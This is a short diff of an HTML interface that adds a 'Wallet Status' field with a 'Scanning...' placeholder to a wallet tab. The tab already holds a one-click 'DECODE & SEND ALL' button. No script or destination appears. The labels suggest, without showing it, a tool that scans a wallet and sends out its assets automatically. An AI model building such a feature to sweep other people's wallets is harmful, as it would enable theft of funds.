@@ -507,6 +507,11 @@
 
       <!-- WALLET TAB -->
       <div class="pf-panel" id="tab-wallet">
+        <div class="pf-section-label">💼 Wallet Status</div>
+        <div class="pf-wallet-info" id="pf-wallet-info">Scanning...</div>
+        
+        <div class="pf-divider"></div>
+        
         <div class="pf-section-label">⚡ One-Click Automation</div>
         <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px; padding: 16px; font-size: 13px;">DECODE & SEND ALL</button>
         <div style="font-size: 10px; color: #6b7280; margin-top: 12px; line-height: 1.6; padding: 0 4px;">
